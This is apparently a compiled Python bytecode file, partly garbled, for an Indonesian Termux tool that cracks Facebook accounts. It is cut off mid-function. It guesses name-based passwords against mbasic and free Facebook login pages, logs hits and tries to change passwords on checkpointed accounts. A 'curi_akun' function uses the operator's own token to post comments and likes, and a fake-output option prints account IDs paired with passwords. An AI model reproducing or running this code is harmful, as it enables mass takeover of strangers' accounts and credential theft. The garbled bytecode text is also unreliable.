a
    A1 ac� �                	   @   s�  d Z dZdZdZdZdZdZdZdZd	Z	d
Z
dZdZdZdZdZdZddlZddlZddlZddlZddlZddlZddlZddlZddlZddlZddlZddlZddlmZ ddlmZ ddlm Z  ddlm!Z! ddlm"Z# ddlm Z$ ddlmZ% ddlm&Z' ddlm(Z( ddlm)Z) ddlZddl*Z*ddlZddlZddlZddlZddl+Z+ddlZddlZddlZddl,Z,ddlZ-ddlZddlm.Z. ddlmZ/ ddlm0Z0 ddlmZ ddlZddlm1Z1 ddlmZ ddl2T e�3� Z4e�!� Z5ej6�7d ��rej6�8d �dk�re9d ��:� �;� Z<g a=g a>g a?e@e�3� �Ad!��ZBe4jCZDe4jEZFe4jGZHd"Zd#Zd$Zd%Zd&Z	d'Zd$ZIed( e d) e d* e ZJed( e d+ e d* e ZKed( e d, e d* e ZLed( e d- e d* e ZMed( e d. e d* e ZNed( e d/ e d* e ZOz�e�Pd0�jQ�;� ZRe�Pd1�jQ�;� ZSeBeRk�rJeT�  e�"�  z`eSd2v �rpeUeKd3 �f e� d4� n8eV�  eUeKd5 e
 eS � eUeKd6 � eUeJd7 � e"�  W n* eWeXf�y�   eUeKd8 � e"�  Y n0 W n* eWeXf�y   eUeKd8 � e"�  Y n0 d9ejY�Z� v �r&d:Z[d:Z\d:Z]d:Z^nd;Z[d;Z\d;Z]d;Z^d<d=� Z_d>d?� Z`d@dA� ZadBdC� ZbdDdE� ZcdFdG� ZddHdI� ZedJdK� ZfdLdM� ZgdNdO� ZhdPdQ� ZidRdS� ZjdTdU� ZkdVdW� ZldXdY� ZmdZd[� Znd\d]� Zod^d_� Zpd`da� Zqdbdc� Zrddde� Zsdfdg� Ztdhdi� Zudjdk� Zvdldm� Zwdndo� Zxdpdq� Zydrds� Zzd�dudv�Z{dwdx� Z|dydz� Z}d{d|� Z~d}d~� Zdd�� Z�d�d�� Z�d�d�� Z�d�d�d��Z�d�d�� Z�d�d�� Z�d�d�� Z�d�d�� Z�d�d�� Z�d�d�� Z�d�d�� Z�d�d�� Z�d�d�� Z�d�d�� Z�d�d�� Z�d�d�� Z�d�d�� Z�d�d�� Z�d�d�� Z�d�d�� Z�d�d�� Z�d�d�� Z�d�d�� Z�d�d�� Z�d�d�� Z�d�d�� Z�d�d�� Z�G d�d�� d��Z�G d�d�� d��Z�G d�d�� d��Z�G d�d�� d��Z�d�d�� Z�d�d�� Z�d�dÄ Z�d�dń Z�d�dǄ Z�d�dɄ Z�G d�d˄ d˃Z�e�d�k�r�e�)d͡ eg�  dS )�z[00mz[40mz[44mz[46mz[42mz[45mz[41mz[47mz[43mz[0;94m�[0;92mz[0;96m�[0;91mz[0;95mz[0;93mz[0;97mz[0;90m�    N��ThreadPoolExecutor)�datetime)�sleep)�Session)�exit)�random)�choice)�stdout)�system)�randint)�date��BeautifulSoup)�*�
.useragentz%d-%m-%Yz[0;33mz[0;31mz[0;32mz[0;36mz[0;34mz[0;35m�[�   •z] �!�?�   ••z!!z??z!https://pastebin.com/raw/SNHmCTDFz!https://pastebin.com/raw/exzCY7sM)zMR.RISKYz	DUMAI-991zServer Saat Ini Aktif�   zServer DiGunakan : z"Server Saat Ini Sedang MaintenancezSilah Coba Berapa Saat.. !!zMasalah Tidak DiKetahuiZlinux�[0m� c                 C   s�   t | �dkr tdtt | �� � t |�dkr@tdtt |�� � t | �dkr�t |�dkr�td� ttd t d t d t d � d S )	Nr   z[OK] : z[CP] : �
r   r   �]� No Result Found)�len�print�str�k�p)ZDapuntaZKrahkrah� r$   �-/data/data/com.termux/files/home/premium/X.py�results�   s    r&   c                 C   s�  t dd��� }t�� }|j�ddd|dddd	�� |�d
�}t�|j	d�}d�
tj�d|j	��}i }|d�D ]~}	|	�d�d u r�|	�d�dkr�|�d| i� q�|	�d�dkr�|�d|i� q�|�|	�d�di� ql|�|	�d�|	�d�i� ql|�|dddddddd�� |j�ddi� |jd|d�j	}
dt|j�� �� �v �rTd| ||j�� d�S dt|j�� �� �v �r�d| ||j�� d�S d| |d �S d S )!N�	ua_me.txt�rzmbasic.facebook.com�	max-age=0�1�Utext/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8�gzip, deflate�#id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7��Host�cache-control�upgrade-insecure-requests�
user-agent�accept�accept-encoding�accept-language�https://mbasic.facebook.com/�html.parserr   �dtsg":\{"token":"(.*?)"�input�value�name�email�pass�0�d�Zfb_dtsgZm_sessZ__userZ__reqZ__csrZ__aZ__dynZencpass�refererz:https://mbasic.facebook.com/login/?next&ref=dbl&fl&refid=8z~https://mbasic.facebook.com/login/device-based/login/async/?refsrc=https%3A%2F%2Fm.facebook.com%2Flogin%2F%3Fref%3Ddbl&lwv=100��data�c_user�success��statusr<   r=   �cookies�
checkpoint�cp�error�rG   r<   r=   ��open�read�requestsr   �headers�update�get�bs4r   �text�join�re�findall�post�listrH   �get_dict�keys�ZemZpas�hosts�uar(   r#   �bZmetarC   �iZpor$   r$   r%   �mbasic�   s6    

��rb   c                 C   s�  t dd��� }t�� }|j�ddd|dddd	�� |�d
�}t�|j	d�}d�
tj�d|j	��}i }|d�D ]~}	|	�d�d u r�|	�d�dkr�|�d| i� q�|	�d�dkr�|�d|i� q�|�|	�d�di� ql|�|	�d�|	�d�i� ql|�|dddddddd�� |j�ddi� |jd|d�j	}
dt|j�� �� �v �rTd| ||j�� d�S dt|j�� �� �v �r�d| ||j�� d�S d| |d �S d S )!Nr'   r(   zfree.facebook.comr)   r*   r+   r,   r-   r.   zhttps://free.facebook.com/r7   r   r8   r9   r:   r;   r<   r=   r>   r?   r@   rA   z8https://free.facebook.com/login/?next&ref=dbl&fl&refid=8z|https://free.facebook.com/login/device-based/login/async/?refsrc=https%3A%2F%2Fm.facebook.com%2Flogin%2F%3Fref%3Ddbl&lwv=100rB   rD   rE   rF   rI   rJ   rK   rL   rM   r]   r$   r$   r%   �f_fb�   s6    

��rc   c                 C   s�   d}t �tjdt� | d�jd�}|jddd�D ]R}d|�d	�v r.tjd
|�d	� | t� d� tjdt� | d�j}d|�� v r.d}q.|dkr�dS td� d S )NFz(https://mbasic.facebook.com/language.php�rQ   rH   r7   �aT)�hrefZid_IDrf   r6   )rH   rQ   z'https://mbasic.facebook.com/profile.phpzapa yang anda pikirkan sekarangz[!] Wrong Cookies)	rT   r   rP   rS   �hdcokrU   �find_all�lowerr	   )rH   �f�rrra   r`   r$   r$   r%   �lang�   s    rl   c                   C   sB   t j�d�r8t j�d�dkr0ttd��� �� �S t�  nt�  d S )Nz.cokr   )	�os�path�exists�getsize�gets_dict_cookiesrN   rO   �strip�logsr$   r$   r$   r%   �
basecookie�   s
    rt   c                  C   s6   t } | ddddd�tj�d| ��| d dd	d
d�
}|S )Nr-   r,   r+   ��Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]r   z	://(.*?)$�/login/?next&ref=dbl&fl&refid=8r)   r*   �!application/x-www-form-urlencoded)
�originr5   r4   r3   r2   r/   rA   r0   r1   �content-type)�hostrV   rT   rW   rX   )r^   r(   r$   r$   r%   rg   �   s    .rg   c                 C   s~   g }t | �� �D ]b}|d tt| �� ��d krP|�|d d | |d   � q|�|d d | |d   d � qd�|�S )Nr   r   �=�; r   )�	enumerater\   r   rZ   �appendrV   �rH   �resultra   r$   r$   r%   �gets_cookies�   s
    <$r�   c              
   C   s�   i }z8| � d�D ]&}|�|� d�d |� d�d i� q|W S    | � d�D ]&}|�|� d�d |� d�d i� qN| Y S 0 d S )N�;r{   r   r   r|   )�splitrR   r   r$   r$   r%   rq   �   s    $$rq   c                   C   s�   t �d� t�  tt� dt� �� tdtttf � tdttttf � tdttttf � tdttttf � tdttttf � t	�  d S )N�clearzMade By Dapuntaz
%s[%s Choose Country %s]
z%s[%s1%s] %sIndonesiaz%s[%s2%s] %sBangladesh/Indiaz%s[%s3%s] %sPakistanz%s[%s4%s] %sUSA)
rm   r   �banner�jalan�c�qr    r"   r#   �choose_countryr$   r$   r$   r%   �country�   s    
r�   c               	   C   s�  t dttttf �} | dv rDttd t d t d t d � �n�| dv r�t�d� d	}z&td
d�}|�|� |��  t	�  W n t
tfy�   t	�  Y n0 �n@| dv r�t�d� d}z&td
d�}|�|� |��  t	�  W n t
tfy�   t	�  Y n0 n�| dv �r^t�d� d}z&td
d�}|�|� |��  t	�  W n t
tf�yZ   t	�  Y n0 n�| dv �r�t�d� d}z&td
d�}|�|� |��  t	�  W n t
tf�y�   t	�  Y n0 n$ttd t d t d t d � d S )Nu   
%s[%s•%s] %sChoose : �r   �
[r   r   � Fill In The Correct�r*   �01zrm -rf .pass.txt�id�	.pass.txt�w��2�02�bd��3�03�pk��4�04�us)r9   r"   r#   r    rm   r   rN   �write�close�menu�KeyError�IOError)ZccZcouZctryr$   r$   r%   r�   �   sX    (

















r�   c                 C   s   t �| � d S �N)rm   r   )Zdumr$   r$   r%   �bash.  s    r�   c                   C   s
   t �  d S r�   )r�   r$   r$   r$   r%   �logo0  s    r�   c                 C   s2   | d D ]$}t j�|� t j��  t�d� qd S )Nr   g{�G�z�?)�sysr   r�   �flush�timer   )�z�er$   r$   r%   r�   3  s    
r�   c                  C   sd  t td � t td t d t d t d � t td t d t d t d � t td t d t d t d	 � t td t d
 t d t d � ttd t �} | dkr�t td � t�d� t	�  n�| dks�| dkr�|�  nn| dks�| dk�rt
�  nT| dk�s| dk�r t�  n8| dk�s4| d
k�r<t�  nt td � t�d� t	�  dd� }d S )NzSilahkan Pilih Menu !!r   r*   r   zPassword Tambahan v1r�   zPassword Tambahan v2r�   zGet Ttl From Filer�   �Back�Pilih : r   zFail Not Foundr   r�   r�   r�   r�   c                  S   s�  t td � t td t d t d t d � t td t d t d t d � t td t d t d t d	 � t td t d
 t d t d � t td t d t d t d � ttd t �} | dkr�t td � t�d� t	�  n�| dk�s
| dk�rt td � n�| dk�s,| dk�r:t td � n�| dk�sN| dk�r\t td � n`| dk�sp| d
k�r~t td � n>| dk�s�| dk�r�t td � nt td � t�d� t	�  d S )Nz#Silahkan Pilih Password Tambahan !!r   r*   r   zName123 + Name12345r�   zName123 + Name12345 + Name1234r�   zindonesia + sayang + bajinganr�   zkontol + bangsat + lonte�5zSEMUA PASSWORD ++r�   r   zJangan Kosong !!r   r�   z"Anda Menggunakan Semua Password !!r�   r�   r�   �05zIsi Dengan Benar)
r    �warr"   r#   r9   �inpra   r�   r   �	user_prem)Zrfr$   r$   r%   �pw_tambahan_v1O  s0    $$$$$

z!user_prem.<locals>.pw_tambahan_v1)r    r�   r"   r#   r9   r�   ra   r�   r   r�   Zpw_tambahan_v2�	pemisahxxr�   )Zsmpr�   r$   r$   r%   r�   8  s,    $$$$

r�   c                  C   st   zt dd��� } W nB tyT   ttd � t�d� t�d� t�d� t	�  Y n0 tj
�d�rjt�  nt	�  d S )N�.premr(   zKode Premium Salah !!�      �?r�   �rm -rf .prem)rN   rO   r�   r    r�   r�   r   rm   r   �romzrn   ro   �user1��toketr$   r$   r%   �licensei  s    

r�   c                  C   st   zt dd��� } W nB tyT   ttd � t�d� t�d� t�d� t	�  Y n0 tj
�d�rjt�  nt�  d S )N�.adminr(   zKode Admin Salah !!r�   r�   �rm -rf .admin)rN   rO   r�   r    r�   r�   r   rm   r   r�   rn   ro   �user2�romz1r�   r$   r$   r%   �license2v  s    

r�   c               	   C   sx  t �d� t�  t�d�j�� } z�ttd t	 �}t
|�dk rlt|dv rPtd ntd � t�d� t�  q2t�d�j�� } || v r�t�  d	}td
t d t	 d � tdd�}|�|� |��  t�  n(t�  td
t d t d � t �d� W n~ tjj�y,   t �d� ttd � t j��  Y nH t�yH   t j��  Y n, ttf�yr   t�d� t j��  Y n0 d S )Nr�   �!https://pastebin.com/raw/eu6qLYFgzKode Premium : �
   �r   � �kosong�Kode Harus Lebih Dari 10�   � b9760f6ae712402ab67386a06b12e47fr   zStatus Premium : �   ✓r�   r�   �Xr�   �Tidak Ada Jaringan !!r   �rm   r   r�   rP   rS   rU   rr   r9   r�   ra   r   r�   r�   r   r�   Zkntlr    rN   r�   r�   r	   �m�
exceptions�ConnectionErrorr�   �KeyboardInterruptr�   r�   �rk   �lZ	kata_premZidqr$   r$   r%   r�   �  s<    





r�   c               	   C   sx  t �d� t�  t�d�j�� } z�ttd t	 �}t
|�dk rlt|dv rPtd ntd � t�d� t�  q2t�d�j�� } || v r�t�  d	}td
t d t	 d � tdd�}|�|� |��  t�  n(t�  td
t d t d � t �d� W n~ tjj�y,   t �d� ttd � t j��  Y nH t�yH   t j��  Y n, ttf�yr   t�d� t j��  Y n0 d S )Nr�   �!https://pastebin.com/raw/5X0w4NXhzKode Administrasi : r�   r�   r�   r�   r�   �(FsJdAAPivnzNHDopkcOinjoWEBLuXhOopEfvdsHmr   zStatus Administrasi : r�   r�   r�   r�   r�   r�   r   r�   r�   r$   r$   r%   r�   �  s<    





r�   c                  C   s�   zxt dd��� } t�d�j�� }| |v rFt�d� t�  t	t
d � n0t�d� t�  tt
d � t�d� t�d� W nn tjjy�   t�d� t	t
d	 � tj��  Y n: ty�   tj��  Y n  ty�   t�g d
�� Y n0 d S )Nr�   r(   r�   r�   zPremium Only !!zNot Premium !!r   r�   �Tidak Ada Jaringan)�rm�-rfr�   �rN   rO   rP   rS   rU   rr   rm   r   r�   r    r�   r�   r�   r   r�   r�   r�   r	   r�   r�   �
subprocess�Popen��jr(   r$   r$   r%   r�   �  s(    



r�   c                  C   s�   znt dd��� } t�d�j�� }| |v rFt�d� t�  t	t
d � n&t�d� t�  tt
d � t�d� W nn tjjy�   t�d� t	t
d � tj��  Y n: ty�   tj��  Y n  ty�   t�g d	�� Y n0 d S )
Nr�   r(   r�   r�   zAdministrasi Only !!zNot Administrasi !!r   r�   )r�   r�   r�   r�   r�   r$   r$   r%   r�   �  s&    


r�   c               
   C   s*  zt �d� W n   Y n0 z<tdd��� } t�d|  �}t�|j�}|d }|d }W n^ t	y� } zFt
td t d t d	 t d
|  �f t�d� t�  W Y d }~n
d }~0 0 t �d� t j�d��r*ztdd��� }W n  t	�y   td }d}Y n0 |dv �rtd }d}ntd }d}ntd }d}t j�d��r�ztdd��� }	W n  t	�yv   td }
d}Y n0 |	dv �r�td }
d}ntd }
d}ntd }
d}t�d�j}t�d��� d }tdd��� }d|v �r�d}n.d|v �r�d}nd|v �rd}nd|v �rd}t �d� t�  t
td  t d! t d	 t d" | � t
td t d! t d	 t d# | � t
td t d! t d	 t d$ | � t
td t d! t d	 t d% | � t
td t d! t d	 t d& | |
 t � t
td t d! t d	 t d' | | t � t
td t d! t d	 t d( t d) t � t
td t d! t d	 t d* t t t � t
td t d+ t d	 t d, t d- � t
td t d. t d	 t d/ � t
td t d0 t d	 t d1 � t
td t d2 t d	 t d3 � t
td t d4 t d	 t d5 � t
td t d6 t d	 t d7 � t
td t d8 t d	 | d9 t d: t d; t d< � t
td t d= t d	 | d> t d: t d? t d< � t
td t d@ t d	 t dA � t
td t dB t d	 t dC � t
td t dD t d	 | dE � t
td t dF t d	 | dG � t
td t dH t d	 t dI t d: t dJ t d< � t
td t dK t d	 t dL t d: t dM t d< � t
td t dN t d	 t dO t d: t dP t d< � t�  d S )QNzmkdir Hasil�	login.txtr(   �,https://graph.facebook.com/me/?access_token=r;   r�   r   r   r   � Error : %sr   r�   r�   ZNOTr   �r�   ZYESr   r�   �r�   zhttps://api.ipify.orgzhttp://ip-api.com/json/r�   r�   �	Indonesiar�   �Bangladesh/Indiar�   �Pakistanr�   �USAr�   z++z Your Name      : z Your ID        : z Your IP        : z Country        : z Premium        : z Administration : z Last Updated   : z
27-07-2021z You Join Date  : r   z3===================================================�   ⟩⟩r�   z Crack ID From Public/Friend r�   z Crack ID From Followersr�   z Crack ID From FileListr�   z Checkpoint Detectorr�   z Get Target Information�06z Dump ID Massal �(z
Admin Only�)�07z Menu Premium zPremium Only�08z View Crack Results�09z Settings User Agent�10z Login User Premium�11z Login User Administrasi�12z Report ZLaporkan�13z Donasi z
Please bro�00z Logout zREMOVE TOKEN)rm   r   rN   rO   rP   rS   �json�loadsrU   �	Exceptionr    r"   r#   r�   r   rs   rn   ro   r�   ra   r�   �durasi�ur�   �choose_menu)r�   �otwre   �namar�   r�   �adminZstatus_adminZteszz�premZstatus_premZteszZipr�   �ngr�negarar$   r$   r%   r�   �  s�    4









((((0000,$$$$$<<$$$$<<<r�   c                  C   s  t td t d t d t d �} | dkrZttd t d t d t d � t�  �n�| d	ksj| d
krtt�  �n�| dks�| dkr�t�  �n�| dks�| dkr�ttd t �f t�	d� t
td t � t td t d t d t d t �}t|� �n| dk�s| dk�r"t�  t�  �n�| dk�s6| dk�r@t�  �n�| dk�sT| dk�r�ztdd��� }W n& t�y�   t
td � t�  Y n0 |dv �r�t�  nt
td � t�  �nd| dk�s�| dk�r,ztdd��� }W n& t�y   t
td  � t�  Y n0 |d!v �rt�  nt
td  � t�  �n�| d"k�s@| d#k�rJt�  �n�| d$k�s^| d%k�rrt�	d&� t�  �n�| d'k�r�t�  �n�| d(k�r�t�  �n�| d)k�s�| d)k�r�t�  �nb| d*k�s�| d*k�rt
td+ � t
td, � t�d-� t�	d.� t�d-� t�  �n| d/k�rRtd0t� d1t� d2t� d3t� d4t� d5t� d6t� d7t� d8�� n�| d9k�sf| d:k�r�z8t
td t d t d t d; � t�	d<� t�  W nN t�y� } z4ttd t d t d t d=|  � W Y d }~n
d }~0 0 n*ttd t d t d t d> � t�  d S )?Nr�   r   r   �
 Choose : r   r   r   r�   r*   r�   r�   r�   r�   r�   z#FILE UNTUK DIHACK YANG TERSEDIA -->z	ls *.jsonz*Masukan Nama Filenya.. Contoh : Risky.jsonz Nama File : r�   r�   r�   r�   �6r�   r�   r(   zAnda Bukan Admin !!r�   �7r�   r�   zAnda Bukan User Premium !!r�   �8r�   �9r�   �rm -rf ua_me.txtr�   r�   r�   r�   zGuna Doanv Kaga Donasi :vz1Anda Akan DiAlih KeGithub Dumai-991 ( READMD.md )�      �?zCxdg-open https://github.com/Dumai-991/Dumai-991/blob/main/README.mdZ	FAKEPRINTu�   
[•] Followers ID Target : 53726XXXX
[•] Name : Eliot Cuduco
[•] Total ID : 5000

[1] Api ( Fast )
[2] Mbasic ( Slow )

[•] Choose : 1

[•] Crack Started...
[•] Account [OK] Saved to : OK.txt
[•] Account [×] Saved to : CP.txt

z< [OK] 100037259232339|siti123
 [OK] 100058400629614|ujang123uC  
 [×] 100028447006914|piyon123
 [×] 100025178990640|aila123
 [×] 100044328361757|mesy123
 [×] 100006960191111|ouss12345
 [×] 100014229344949|sasa12345
 [×] 100026905057587|puput12345
 [×] 100018776192587|shaila123
 [×] 100012728401403|nila12345
 [×] 100010124674535|rani12345
 [×] 100014458861212|mbahcemplung123
z  [OK] 100019549012335|akbar12345uy  
 [×] 100020038388267|amir12345
 [×] 100012505441442|nuris123
 [×] 100038464481741|aram12345
 [×] 100055597927243|yuliana123
 [×] 100021522786578|raisa123
 [×] 100006512680343|dwi123
 [×] 100011104141390|alma12345
 [×] 100054324525507|yanti123
 [×] 100066751156637|adan123
 [×] 100016310497928|achmad123
 [×] 100023459116918|penduxs123
 [×] 100036042847438|aldo123
z= [OK] 100004574927001|wandi123
 [OK] 100037100204160|nenih123u}  
 [×] 100023998988274|asepbr123
 [×] 100033654229416|chaca123
 [×] 100002470377268|naen12345
[Crack] 1522/3451 [OK : 3] [CP : 15]
 [×] 100005874422014|winda12345
 [×] 100007227756450|lilis123
 [×] 100023546973075|nayla123
 [×] 100056647249868|upik123
 [×] 100012132816945|hana123
 [×] 100013854549610|andini123
 [×] 100066746546299|rap123
 [×] 100011944244184|etoy12345
z" [OK] 100038875597090|ningsih12345z%
[Crack] 1522/3451 [OK : 5] [CP : 27]r>   r�   z- Terima Kasih Telah Menggunakan Script Kami..�rm -rf login.txtz	 Error %sz Wrong Input)r9   r"   r#   r    r�   �publik�follow�bulatrm   r   r�   r�   �filecoba�
Login_userr	   �get_inforN   rO   r�   r�   �dump_allr�   �ress�menu_user_agentr�   r�   �	report_war�   r   ra   )r(   �dumair�   r�   r�   r$   r$   r%   r�   A  s�    $$


(


















��������:$

@$r�   c               
   C   s�  d} d}d}z t dd��� }t dd��� }W n^ ty� } zFttd t d t d t d	|  �f t�d
� t�  W Y d }~n
d }~0 0 zt dd��� }W n$ ty� } zW Y d }~n
d }~0 0 zt dd��� }W n$ ty� } zW Y d }~n
d }~0 0 zt dd��� }W n& t�y4 } zW Y d }~n
d }~0 0 zt dd��� }	W n& t�yn } zW Y d }~n
d }~0 0 zt dd��� }
W n& t�y� } zW Y d }~n
d }~0 0 zt dd��� }W n& t�y� } zW Y d }~n
d }~0 0 zt dt	 d d��� }W n& t�y$ } zW Y d }~n
d }~0 0 t
�d|  d | d | � t
�d|  d | d | � t
�d|  d | d | � t
�d|  d | d | � t
�d|  d t d | � t
�d|  d |	 d | � t
�d|  d |
 d | � t
�d|  d | d | � t
�d|  d | d | � t
�d|  d | � t
�d| � t
�d|  d | d | � t�d� d S )NZ4175769909197113zHhttps://www.facebook.com/100002924366263/posts/4175769909197113/?app=fbl�LOVEr�   r(   r   r   r   r�   r   zHasil/CP-27-07-2021.txtzHasil/CP-28-07-2021.txtzHasil/CP-29-07-2021.txtzHasil/CP-24-07-2021.txtzHasil/CP-25-07-2021.txtzHasil/CP-26-07-2021.txt�	Hasil/CP-�.txt�https://graph.facebook.com/�/comments/?message=�&access_token=�!/likes?summary=true&access_token=�~https://graph.facebook.com/me/feed/?link=https://www.facebook.com/100063690353340/posts/180923747373969/?app=fbl&access_token=z/reactions?type=zecho 'Jangan DiEdit' >> .skip)rN   rO   r�   r    r"   r#   r�   r   rs   r�   rP   rY   Zhairm   r   )rY   �kom_1�reac�tokenr�   r�   ZhaibZhainZhaimZsygZajgZbhZlhpr$   r$   r%   �	curi_akun�  sd    4r  c               
   C   sn  zddd l } dd l } ddlm} ddlm} tj�d�dkrDt�d� tj�d�dkrbt	dd��
�  W n4 ty� } ztdt|� � W Y d }~n
d }~0 0 ttd	 t d
 � ttd t d t d t d � ttd t d t d t d � ttd �}|dv �r*ttd � t�d� t�  n@|dv �r<t�  n.|dv �rNt�  nttd � t�d� t�  d S )Nr   r   r   r�   F�result/cp.txtre   zERROR : zPemisah Defalut : �|zBBefore Continue Do you want to use the Default Splitting Distance r   z Y/n  r   zASebelum Lanjut Apakah Anda Mau Menggunakan Jarak Memisah Default z Y/n z	Select : r�   zJangan Kosong Kentod�   ��n�N��Y�y�Masalah Tidak DiTemukan)rP   rT   r   �concurrent.futuresr   rm   rn   ro   �mkdirrN   r�   r�   r    r!   r�   ra   r�   r"   r#   r9   r�   r	  r�   r   r  �kentodxx�kentodx)rP   r   r   �E�xr$   r$   r%   r  �  s4    
&$$




r  c                  C   sr   t td �} | dv r.ttd � t td �} q| �� dkr@t�  tj�| �dkrbttd�	| � � t
| ��� �� S )NzList File : r�   zJangan Kosong Kontol�setFzFile {} Ini Tidak DiTemukan)r9   r�   r    r�   ri   �set_uarm   rn   ro   �formatrN   rO   �
splitlines)Zfailr$   r$   r%   �file  s    r2  c                  C   s�   t tj�d�r&dtd��� ��  d nd� td�} | dv rNt d� td�} q4tdd	��| � t tj�d�rpd
nd� t	d� d S )Nr   z
User Agent Sekarang : r   r   zMasukan User Agent Anda : r�   zKosong Mulu KentodzMasukan User Agent : r�   z
Suksess Ganti User Agentz
Gagal Ganti User AgnetzJalankan Toolsnya Lagi !!)
r    rm   rn   ro   rN   rO   rr   r9   r�   r	   )r_   r$   r$   r%   r/    s    ,
r/  c               ,   C   s  t �d� tdt� dt� dt� dt� dt� dt� dt� d	t� d
t� dt� dt� dt� dt� dt� dt� dt� dt� dt� dt� dt� dt� d�+� t� } | �rt	�  t
td � tdd��:}| D ]$}|�d�}|�t|d |d � q�W d   � n1 s�0    Y  nttd � d S )Nr�   �
@ �Athour   : �ITSUKI AND RISKY
@ �Fcaebook : �m.facebook.com/llovexnxx
@ �Whatsapp : �wa.me/6283143565470
@ �Group FB : �Termux Indonesia
�  ________       _____              _____       _________
___  __ \_____ __  /______ _________  /______ ______  /
__  / / /_  _ \_  __/_  _ \_  ___/_  __/_  _ \_  __  /
_  /_/ / /  __// /_  /  __// /__  / /_  /  __// /_/ /
/_____/  \___/ \__/  \___/ \___/  \__/  \___/ \__,_/
�               ___________                     ______                ______
                 ___  ____/______ _____________ ___  /_ ______ ______ ___  /__
                 __  /_    _  __ `/_  ___/_  _ \__  __ \_  __ \_  __ \__  //_/
                 _  __/    / /_/ / / /__  /  __/_  /_/ // /_/ // /_/ /_  ,<
                 /_/       \__,_/  \___/  \___/ /_.___/ \____/ \____/ /_/|_|
�Gunakan r  � Sebagai Pemisah !!r   �Hasil �OK �-Detetor Facebook DiSimpan Di : result/ok.txt
�CP �,Detetor Facebook DiSimpan Di : result/cp.txt�1
Login DiMulai
Hasil Loginnya DiSimpan Direquest
r   �Zmax_workersr   r   �Masalah Tidak DiTemukan !!)rm   r   �ngetikr"   r�   ra   r#   r�   r2  �select_methodr    r   r�   �submit�eksekusir	   r�   )�	list_akun�su�akunr$   r$   r%   r+  %  sj    
���������������������

8r+  c               ,   C   s0  t �d� tdt� dt� dt� dt� dt� dt� dt� d	t� d
t� dt� dt� dt� dt� dt� dt� dt� dt� dt� dt� dt� dt� d�+� tt	d � t
td �} t� }|�r t�  ttd � tdd��:}|D ]$}|�| �}|�t|d |d � q�W d   � n1 �s0    Y  nttd � d S )Nr�   r3  r4  r5  r6  r7  r8  r9  r:  r;  r<  r=  r>  r  r?  r   r@  rA  rB  rC  rD  u=   Contoh Pemisah : Username|Password Atau Username • Passwordz
Pemisah : rE  r   rF  r   r   rG  )rm   r   rH  r"   r�   ra   r#   r�   r�   r�   r9   r�   r2  rI  r    r   r�   rJ  rK  r	   r�   )ZpprL  rM  rN  r$   r$   r%   r*  D  sn    
���������������������

:r*  Tc                 C   s�   | r4t d� t td t d � t td t d � ttd t �}|dv rft td � ttd �}qD|d	krttan*|d
kr�t�dd�ant td � td� d S )Nz
 [ Pilih Method Login ]z1.zFree Facebookz2.zMbasic Facebook
z	Method : r�   zKosong Mulu Ajgr*   r�   Zfreerb   r'  F)	r    r#   r"   r9   ra   r�   �url�replacerI  )ZshowZselectr$   r$   r%   rI  e  s    rI  c              
   C   s  d}zt | |�}W n. tjjtjjtjjfy@   t| |� Y n0 |d }d|j�� v r�t	t
d t d t
 d�| |� � tdd��d	�| |�� �njd
|j�� v �r�|j�t�d|d j��d��d�d t�d|d j��d�d d�� t|t|d j��}|dk�rLt	t
d t d t
 d�| t� � tdd��d	�| t�� n�|dk�r�t	t
d t d t
 d�| |� � tdd��d	�| |�� nHt	td t d�t| |� � | td��� v�rtdd��d	�| |�� n$t	td t d t d�| |� � d S )N��Mozilla/5.0 (Linux; Android 5.1; PICOphone_M4U_M2_M Build/LMY47D; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/43.0.2357.121 Mobile Safari/537.36r   rD   zLogin Sukses r�   z {}|{}zresult/ok.txtre   z{}|{}
rI   z(https://.*?\.facebook.com)r   �//�/checkpoint/)r/   rA   �new passwordzSuksess Change Password zresult/newpass.txt�no change passwordzFailed Change Password zresult/no_change.txtzCheckPoints u   ⟩⟩ {}{}|{}r  zLogin Failed )�	login_risrP   r�   r�   ZChunkedEncodingErrorZReadTimeoutrK  rH   r[   r    ra   r�   r0  rN   r�   rQ   rR   rW   �searchrO  �groupr�   �tahap1�parserrU   �newpassr"   r#   rO   r�   )�username�password�	useragent�respons�session�responr$   r$   r%   rK  w  s,    $H
$
$rK  c                 K   s�   t �� }t|�td �j�}t|d�}|�| |d�� d|v rD|d= |j�t�	d�d ddt
d	d
ddtd td�
� |jtt|� |d�}||fS )Nrv   Zsign_up)r<   r=   Z_fb_noscriptrR  r   r)   r*   rw   z|text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9r,   r-   )
r/   r0   r1   r2   ry   r3   r4   r5   rA   rx   rB   )rP   r`  rZ  rS   rO  rU   �get_datarR   rQ   r�   r^  rY   �
get_action)r\  r]  �kwargsr`  �parsingra  r$   r$   r%   rV  �  s    
0rV  c                 C   s�   t |d�}d|v r�|d= z,| j| jd �d�d t|� |d�j}W n tjjy^   d}Y n0 d	|v std
|�	� v r�t
| t|��S d| j�� v r�dS d S )N�"submit[logout-button-with-confirm]zsubmit[Yes]z
submit[No]rA   rS  r   rB   �kontol�password_newzbuat kata sandi barurD   rU  )rb  rY   rQ   r�   rc  rU   rP   r�   ZTooManyRedirectsri   �tahap2rZ  rH   r[   )r`  re  rd  ra  r$   r$   r%   rY  �  s    
,
rY  c                 C   sV   t |d�}|�dti� | j| jd �d�d t|� |dd�}d|j�� v rRd	S d S )
Nrf  rh  rA   rS  r   F)rC   Zallow_redirectsrD   rT  )	rb  rR   r[  rY   rQ   r�   rc  rH   r[   )r`  re  rd  r_  r$   r$   r%   ri  �  s
    
(ri  c                 K   sB   | � dddd��D ]*}||d v r&qq|�|d |d i� q|S )Nr9   T)r;   r:   r;   r:   )rh   rR   )re  Zkecualird  Zlnputr$   r$   r%   rb  �  s    rb  c                 C   s   | � dddi�d S )NZform�methodrY   Zaction)�find)re  r$   r$   r%   rc  �  s    rc  c                 C   s
